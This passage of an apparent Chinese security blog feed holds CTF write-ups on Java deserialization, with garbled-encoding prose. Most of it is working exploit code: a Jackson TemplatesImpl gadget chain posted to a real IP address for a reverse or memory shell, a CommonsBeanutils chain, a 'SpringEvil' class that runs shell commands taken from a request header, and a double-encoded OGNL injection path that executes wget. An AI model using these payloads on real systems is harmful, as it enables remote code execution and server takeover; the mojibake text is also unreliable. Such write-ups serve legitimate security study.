class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠ¥é”™</p><p><a href="https://imgse.com/i/p9d3AIO"><img src="https://s1.ax1x.com/2023/05/07/p9d3AIO.png" alt="p9d3AIO.png"></a></p><p>é—®é¢˜å‡ºåœ¨<code>com.fasterxml.jackson.databind.node.BaseJsonNode#writereplace</code></p><p><a href="https://imgse.com/i/pC3V4f0"><img src="https://s1.ax1x.com/2023/06/19/pC3V4f0.png" alt="pC3V4f0.png"></a></p><p><a href="https://imgse.com/i/pC3VT6U"><img src="https://s1.ax1x.com/2023/06/19/pC3VT6U.png" alt="pC3VT6U.png"></a></p><p>åœ¨è¿™é‡ŒæŠ›å‡ºäº†é”™è¯¯ï¼Œè¯´æ˜ååºåˆ—åŒ–æµç¨‹èµ°åˆ°äº†è¿™é‡Œï¼Œè§£å†³ä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥åœ¨åˆ æ‰è¿™ä¸ªåŒ…æˆ–è€…åœ¨ç›¸åŒè½¯ä»¶åŒ…ç›®å½•ä¸‹é‡å†™ï¼Œåˆ é™¤<code>writereplace</code>ç±»å³å¯</p><p><a href="https://imgse.com/i/pC3Z9XD"><img src="https://s1.ax1x.com/2023/06/19/pC3Z9XD.png" alt="pC3Z9XD.png"></a></p><p>ç°åœ¨å°±å¯ä»¥äº†</p><p><a href="https://imgse.com/i/pC3Z8Nn"><img src="https://s1.ax1x.com/2023/06/19/pC3Z8Nn.png" alt="pC3Z8Nn.png"></a></p><p>ä¼ å‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/* loaded from: bypassit.jar:BOOT-INF/classes/com/ctf/bypassit/IndexController.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/bypassit&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">bypassIt</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(request.getInputStream());</span><br><span class="line">            ois.readObject();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;bypass it and rce it&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;bypass it and rce it&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Exp</strong></p><p>å†™å†…å­˜é©¬å’Œåå¼¹shelléƒ½è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bypass_1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpHeaders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PostExp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Tan.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,jsonNodes);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            doPOST(byteArrayOutputStream.toByteArray());</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            var5.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//åå¼¹shell</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doPOST</span><span class="params">(<span class="type">byte</span>[] obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">URI</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;http://81.70.221.206:8080/bypassit&quot;</span>);</span><br><span class="line">        HttpEntity&lt;<span class="type">byte</span>[]&gt; requestEntity = <span class="keyword">new</span> <span class="title class_">HttpEntity</span>&lt;&gt;(obj);</span><br><span class="line">        <span class="type">RestTemplate</span> <span class="variable">restTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);</span><br><span class="line">        System.out.println(res.getBody());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Springå†…å­˜é©¬</span></span><br><span class="line"><span class="comment">//    public static void doPOST(byte[] obj) throws Exception&#123;</span></span><br><span class="line"><span class="comment">//        URI url = new URI(&quot;http://81.70.221.206:8080/bypassit&quot;);</span></span><br><span class="line"><span class="comment">//        HttpHeaders headers = new HttpHeaders();</span></span><br><span class="line"><span class="comment">//        headers.add(&quot;cmd&quot;, &quot;/readflag&quot;);</span></span><br><span class="line"><span class="comment">//        HttpEntity&lt;byte[]&gt; requestEntity = new HttpEntity&lt;&gt;(obj, headers);</span></span><br><span class="line"><span class="comment">//        RestTemplate restTemplate = new RestTemplate();</span></span><br><span class="line"><span class="comment">//        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);</span></span><br><span class="line"><span class="comment">//        System.out.println(res.getBody());</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pC3Z7Ct"><img src="https://s1.ax1x.com/2023/06/19/pC3Z7Ct.png" alt="pC3Z7Ct.png"></a></p><p><a href="https://imgse.com/i/pC3ZxEj"><img src="https://s1.ax1x.com/2023/06/19/pC3ZxEj.png" alt="pC3ZxEj.png"></a></p><h2 id="the-path-to-shell"><a href="#the-path-to-shell" class="headerlink" title="the path to shell"></a>the path to shell</h2><p>url è·¯å¾„ä¸­è¿›è¡Œ ognl è¡¨è¾¾å¼æ³¨å…¥</p><p>éœ€è¦ä¸¤æ¬¡urlç¼–ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/app/user/..%252F..%252F..%252Fbackend%252Faction%252F%2528%2528%256E%2565%2577%2520%256A%2561%2576%2561%2578%252E%2573%2563%2572%2569%2570%2574%252E%2553%2563%2572%2569%2570%2574%2545%256E%2567%2569%256E%2565%254D%2561%256E%2561%2567%2565%2572%2528%2529%2529%252E%2567%2565%2574%2545%256E%2567%2569%256E%2565%2542%2579%254E%2561%256D%2565%2528%2527%256A%2573%2527%2529%2529%252E%2565%2576%2561%256C%2528%2527%256A%2561%2576%2561%252E%256C%2561%256E%2567%252E%2552%2575%256E%2574%2569%256D%2565%252E%2567%2565%2574%2552%2575%256E%2574%2569%256D%2565%2528%2529%252E%2565%2578%2565%2563%2528%2522%2577%2567%2565%2574%2520%256C%256F%2563%2561%256C%2568%256F%2573%2574%253A%2531%2532%2533%2534%2522%2529%2527%2529</span><br></pre></td></tr></table></figure><h2 id="bypassit-II"><a href="#bypassit-II" class="headerlink" title="bypassit II"></a>bypassit II</h2><p>é€šè¿‡è¯»å†™&#x2F;proc&#x2F;self&#x2F;memï¼Œç»•è¿‡nativerasp.soï¼Œä¸å¤ªä¼š.</p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€äº›Javaé¢˜ç›®</title>
      <link href="/2023/04/11/Java-timu/"/>
      <url>/2023/04/11/Java-timu/</url>
      
        <content type="html"><![CDATA[<h1 id="Javaé¢˜ç›®"><a href="#Javaé¢˜ç›®" class="headerlink" title="Javaé¢˜ç›®"></a>Javaé¢˜ç›®</h1><p><strong>é¢˜ç›®é™„ä»¶é“¾æ¥ï¼š</strong><a href="https://github.com/gh0st-9/Java-Study/tree/main/Java%E9%A2%98%E7%9B%AE%E5%8F%8A%E9%99%84%E4%BB%B6">https://github.com/gh0st-9/Java-Study/tree/main/Java%E9%A2%98%E7%9B%AE%E5%8F%8A%E9%99%84%E4%BB%B6</a></p><h2 id="æ·±è‚²æ¯Web-log"><a href="#æ·±è‚²æ¯Web-log" class="headerlink" title="æ·±è‚²æ¯Web-log"></a>æ·±è‚²æ¯Web-log</h2><p><code>/?logname=cb-0.0.1-SNAPSHOT.jar</code>ä¸‹è½½é¢˜ç›®jaråŒ…</p><p>å‘ç°å­˜åœ¨<code>commons-beanutils1.8.2</code>ä¾èµ–</p><p>æœ‰ä¸ªè·¯ç”±æ¥å—ä¼ å…¥çš„userå‚æ•°å¹¶å¯¹å…¶base64è§£ç åè¿›è¡Œååºåˆ—åŒ–</p><p><a href="https://imgse.com/i/ppaSEH1"><img src="https://s1.ax1x.com/2023/03/21/ppaSEH1.png" alt="ppaSEH1.png"></a></p><p>éœ€è¦æ‰¾ä¸€æ¡æ— éœ€ccä¾èµ–çš„cbé“¾</p><p><strong>Exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.cb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\SpringEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, Collections.reverseOrder());</span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, beanComparator);queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setValue(beanComparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        String a=encoder.encodeToString((barr.toByteArray())).replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;%2B&quot;</span>);</span><br><span class="line">        System.out.println(a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºé¢˜ç›®ä¸å‡ºç½‘ï¼Œéœ€è¦ç‰¹æ®Šæ¶æ„ç±»</p><p><strong>SpringEvil.class</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.cb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringEvil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SpringEvil</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>);</span><br><span class="line">        c = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line">        m = c.getMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">resp</span> <span class="operator">=</span> m.invoke(o);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">req</span> <span class="operator">=</span> m1.invoke(o); <span class="comment">// HttpServletRequest</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getWriter</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.ServletResponse&quot;</span>).getDeclaredMethod(<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getHeader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>).getDeclaredMethod(<span class="string">&quot;getHeader&quot;</span>,String.class);</span><br><span class="line">        getHeader.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        getWriter.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">writer</span> <span class="operator">=</span> getWriter.invoke(resp);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> (String)getHeader.invoke(req, <span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        String[] commands = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">charsetName</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;window&quot;</span>) ? <span class="string">&quot;GBK&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="string">&quot;WIN&quot;</span>)) &#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span class="string">&quot;/c&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        commands[<span class="number">2</span>] = cmd;</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next());</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;flush&quot;</span>).invoke(writer);</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;close&quot;</span>).invoke(writer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨</p><p><a href="https://imgse.com/i/ppaS8HI"><img src="https://s1.ax1x.com/2023/03/21/ppaS8HI.png" alt="ppaS8HI.png"></a></p><h2 id="é¦™å±±æ¯easy-fastjson"><a href="#é¦™å±±æ¯easy-fastjson" class="headerlink" 